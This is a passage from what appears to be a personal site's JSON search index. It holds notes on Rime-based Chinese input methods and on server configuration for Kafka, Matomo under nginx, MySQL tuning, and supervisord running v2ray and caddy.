rel=\"noopener\"\u003ehttps://github.com/nytlabs/streamtools\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Go Libraries"},{"categories":null,"contents":" 類別 名稱 說明 PC weasel 小狼毫 適用於 Windows 係統的開源輸入法 PC squirrel 鼠須管 適用於 macOS 的開源輸入法 PC ibus-rime 適用於 Linux 係統的開源輸入法 PC openvanilla 專門針對 macOS 開發的開源輸入法 Mobile fcitx5-android 適用於 Android 係統的開源輸入法，從 Fcitx 5 移植而來。 Mobile trime 同文 適用於 Android 係統的開源輸入法，給予 rime 開發而來。 Mobile YuyanIme 雨燕 適用於 Android 係統的開源輸入法，基於 rime 定製開發。 Mobile Hamster 適用於 iOS 係統的開源輸入法，基於 rime 定製開發。 拚音 rime-ice 霧凇拚音，目前知名度最廣的拚音方案之一 拚音 rime-frost 白霜詞庫，基於霧凇拚音進行詞頻調整的拚音方案 拚音 oh-my-rime 薄荷拚音，基於霧凇拚音進行調整的輕量級拚音方案 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/input-method/","summary":"\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e類別\u003c/th\u003e\n          \u003cth\u003e名稱\u003c/th\u003e\n          \u003cth\u003e說明\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePC\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/rime/weasel\" target=\"_blank\" rel=\"noopener\"\u003eweasel 小狼毫\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 Windows 係統的開源輸入法\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePC\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/rime/squirrel\" target=\"_blank\" rel=\"noopener\"\u003esquirrel 鼠須管\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 macOS 的開源輸入法\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePC\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/rime/ibus-rime\" target=\"_blank\" rel=\"noopener\"\u003eibus-rime\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 Linux 係統的開源輸入法\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ePC\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/openvanilla/openvanilla/\" target=\"_blank\" rel=\"noopener\"\u003eopenvanilla\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e專門針對 macOS 開發的開源輸入法\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eMobile\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/fcitx5-android/fcitx5-android\" target=\"_blank\" rel=\"noopener\"\u003efcitx5-android\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 Android 係統的開源輸入法，從 Fcitx 5 移植而來。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eMobile\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/osfans/trime\" target=\"_blank\" rel=\"noopener\"\u003etrime 同文\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 Android 係統的開源輸入法，給予 rime 開發而來。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eMobile\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/gurecn/YuyanIme\" target=\"_blank\" rel=\"noopener\"\u003eYuyanIme 雨燕\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 Android 係統的開源輸入法，基於 rime 定製開發。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eMobile\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/imfuxiao/Hamster\" target=\"_blank\" rel=\"noopener\"\u003eHamster\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e適用於 iOS 係統的開源輸入法，基於 rime 定製開發。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e拚音\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/iDvel/rime-ice\" target=\"_blank\" rel=\"noopener\"\u003erime-ice\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e霧凇拚音，目前知名度最廣的拚音方案之一\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e拚音\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/gaboolic/rime-frost\" target=\"_blank\" rel=\"noopener\"\u003erime-frost\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e白霜詞庫，基於霧凇拚音進行詞頻調整的拚音方案\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e拚音\u003c/td\u003e\n          \u003ctd\u003e\u003ca href=\"https://github.com/Mintimate/oh-my-rime\" target=\"_blank\" rel=\"noopener\"\u003eoh-my-rime\u003c/a\u003e\u003c/td\u003e\n          \u003ctd\u003e薄荷拚音，基於霧凇拚音進行調整的輕量級拚音方案\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","tags":null,"title":"Input-Method Notes"},{"categories":null,"contents":" Kafka consumer.properties max.partition.fetch.bytes=104857600 server.properties socket.send.buffer.bytes=1048576000 socket.receive.buffer.bytes=1048576000 log.retention.bytes=-1 group.initial.rebalance.delay.ms=0 max.message.bytes=1048576000 fetch.message.max.bytes=1048576000 replica.fetch.max.bytes=1048576000 socket.request.max.bytes=1048576000 # 单个索引文件最大 10 MB log.index.size.max.bytes=10485760 # 日志段大小 512 MB（根据需要再调小） log.segment.bytes=536870912 # 避免過多 client 連進來撐爆 broker max.connections=50000 max.connections.per.ip=20000 # 逾時 connections.max.idle.ms=300000 request.timeout.ms=60000 # —— 高并发优化配置 —— # 若需要更高吞吐、能接受更高的调度开销 # num.network.threads=2 # 网络线程数 → CPU 核心数 # num.io.threads=4 # I/O 线程数 → 核心数×2 # 一般num.network.threads主要处理网络io，读写缓冲区数据，基本没有io等待，配置线程数量为cpu核数加1 # num.io.threads主要进行磁盘io操作，高峰期可能有些io等待，因此配置需要大些。配置线程数量为cpu核数2倍，最大不超过3倍. Matomo nginx.conf user www-data; worker_processes auto; pid /run/nginx.pid; include /etc/nginx/modules-enabled/*.conf; events { worker_connections 768; # multi_accept on; } http { ## # Basic Settings ## sendfile on; tcp_nopush on; types_hash_max_size 2048; server_tokens off; # 同時調高打開的檔案數 open_file_cache max=1000 inactive=20s; open_file_cache_valid 30s; open_file_cache_min_uses 2; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_min_length 1024; gzip_comp_level 5; gzip_proxied any; gzip_types text/plain text/css application/javascript application/json image/svg+xml; # 全域 expires 規則 expires 1d; add_header Cache-Control \u0026#34;public\u0026#34;; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } matomo.conf server { listen 80; server_name analytics.matomo.cc; root /var/www/html/matomo; index index.php index.html; access_log /var/log/nginx/matomo.access.log; error_log /var/log/nginx/matomo.error.log warn; location / { try_files $uri $uri/ =404; } # Matomo Rewrite for pretty URLs location ~ ^/(index|piwik|matomo)\\.php(/|$) { fastcgi_split_path_info ^(.+\\.php)(/.*)$; fastcgi_pass unix:/run/php/php8.1-fpm.sock; include fastcgi_params; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param HTTPS off; # 緩衝區 fastcgi_buffers 16 16k; fastcgi_buffer_size 32k; fastcgi_busy_buffers_size 64k; fastcgi_temp_file_write_size 64k; # 逾時 fastcgi_read_timeout 300; fastcgi_connect_timeout 60; fastcgi_send_timeout 60; # 加速 HEAD 請求 fastcgi_ignore_headers X-Accel-Buffering; } # 靜態檔案快取 location ~* \\.(js|woff2?|ttf|css|png|jpg|jpeg|gif|ico|svg)$ { expires max; access_log off; log_not_found off; } # 安全：拒絕存取 .ht* location ~ /\\.ht { deny all; } } crontab */5 * * * * php /var/www/html/matomo/console core:archive --force-all-websites \u0026gt; /var/log/matomo-archive.log 2\u0026gt;\u0026amp;1 MySQL # 臨時表大小 - 可以設定更大 tmp_table_size = 2147483648 # 2GB (約記憶體的3-4%) max_heap_table_size = 2147483648 # 2GB (必須與 tmp_table_size 相同) # 排序緩衝區 - 每個連線獨立使用 sort_buffer_size = 4194304 # 4MB (不要太大，會佔用過多記憶體) # 讀取緩衝區 read_buffer_size = 2097152 # 2MB (你的設定已經合適) read_rnd_buffer_size = 8388608 # 8MB (可以稍微增大) # 連線緩衝區 join_buffer_size = 8388608 # 8MB bulk_insert_buffer_size = 67108864 # 64MB # InnoDB 相關 innodb_buffer_pool_size = 42949672960 # 40GB (約記憶體的60-65%) innodb_log_file_size = 2147483648 # 2GB innodb_log_buffer_size = 67108864 # 64MB # 設定原則 # tmp_table_size \u0026amp; max_heap_table_size： # 這兩個參數必須相同 # 建議設定為記憶體的 2-4% # 64GB 機器建議 1-2GB # sort_buffer_size： # 每個連線都會分配，不要設太大 # 建議 2-8MB，你的 2MB 其實已經合適 # innodb_buffer_pool_size： # 最重要的參數 # 建議設定為記憶體的 60-70% # 64GB 機器建議 38-42GB # TempTable Storage Engine 參數（MySQL 8.0 關鍵） temptable_max_ram = 4294967296 # 4GB（記憶體中臨時表） temptable_max_mmap = 42949672960 # 40GB（記憶體映射檔案） temptable_use_mmap = 1 # 啟用記憶體映射 v2ray supervisord.conf ; supervisor config file [unix_http_server] file=/var/run/supervisor.sock ; (the path to the socket file) chmod=0700 ; sockef file mode (default 0700) [supervisord] logfile=/var/log/supervisor/supervisord.log ; (main log file;default $CWD/supervisord.log) pidfile=/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid) childlogdir=/var/log/supervisor ; (\u0026#39;AUTO\u0026#39; child log dir, default $TEMP) logfileMaxbytes=100MB logfileBackups=50 loglevel=debug ; the below section must remain in the config file for RPC ; (supervisorctl/web interface) to work, additional interfaces may be ; added by defining them in separate rpcinterface: sections [rpcinterface:supervisor] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisorctl] serverurl=unix:///var/run/supervisor.sock ; use a unix:// URL for a unix socket ; The [include] section can just contain the \u0026#34;files\u0026#34; setting. This ; setting can list multiple files (separated by whitespace or ; newlines). It can also contain wildcards. The filenames are ; interpreted as relative to this file. Included files *cannot* ; include files themselves. [include] files = /etc/supervisor/conf.d/*.conf conf.d/v2ray.conf [program:v2ray] command = /etc/v2ray/bin/v2ray run -config /etc/v2ray/config.json -confdir /etc/v2ray/conf process_name = v2ray stdout_logfile = /var/log/supervisor/v2ray.log stderr_logfile = /var/log/supervisor/v2ray.log autostart=true startsecs=3 startretries=3 autorestart=true exitcodes=0 stopsignal=TERM stopwaitsecs=10 stopasgroup=true killasgroup=true [program:caddy] command = /usr/local/bin/caddy run --environ --config /etc/caddy/Caddyfile --adapter caddyfile process_name = caddy stdout_logfile = /var/log/supervisor/caddy.log stderr_logfile = /var/log/supervisor/caddy.log autostart=true startsecs=3 startretries=3 autorestart=true exitcodes=0 stopsignal=TERM stopwaitsecs=10 stopasgroup=true killasgroup=true ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/notes/server/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eKafka\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"consumerproperties\"\u003econsumer.properties\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax.partition.fetch.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e104857600\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"serverproperties\"\u003eserver.properties\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esocket.send.buffer.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1048576000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esocket.receive.buffer.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1048576000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog.retention.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e-1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003egroup.initial.rebalance.delay.ms\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax.message.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1048576000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003efetch.message.max.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1048576000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ereplica.fetch.max.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1048576000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003esocket.request.max.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e1048576000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 单个索引文件最大 10 MB\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog.index.size.max.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e10485760\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 日志段大小 512 MB（根据需要再调小）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003elog.segment.bytes\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e536870912\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 避免過多 client 連進來撐爆 broker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax.connections\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e50000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003emax.connections.per.ip\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e20000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 逾時\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003econnections.max.idle.ms\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e300000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003erequest.timeout.ms\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e60000\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# —— 高并发优化配置 ——\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 若需要更高吞吐、能接受更高的调度开销\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# num.network.threads=2    # 网络线程数 → CPU 核心数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# num.io.threads=4         # I/O 线程数 → 核心数×2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 一般num.network.threads主要处理网络io，读写缓冲区数据，基本没有io等待，配置线程数量为cpu核数加1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# num.io.threads主要进行磁盘io操作，高峰期可能有些io等待，因此配置需要大些。配置线程数量为cpu核数2倍，最大不超过3倍.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eMatomo\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"nginxconf\"\u003enginx.conf\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003euser\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewww-data\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eworker_processes\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eauto\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003epid\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/run/nginx.pid\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003einclude\u003c/span\u003e /etc/nginx/modules-enabled/*.conf;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eevents\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003eworker_connections\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e768\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e# multi_accept on;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ehttp\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# Basic Settings\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003esendfile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003etcp_nopush\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003etypes_hash_max_size\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2048\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003eserver_tokens\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e# 同時調高打開的檔案數\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003eopen_file_cache\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003emax=1000\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003einactive=20s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eopen_file_cache_valid\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e30s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eopen_file_cache_min_uses\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e# server_names_hash_bucket_size 64;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# server_name_in_redirect off;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/nginx/mime.types\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/octet-stream\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e# SSL Settings\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan style=\"color:#75715e\"\u003e##\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#f92672\"\u003essl_protocols\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.1\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.2\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.3\u003c/span\u003e; \u003cspan style=\"color:#75715e\"\u003e# Dropping SSLv3, ref: POODLE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\t\u003cspan 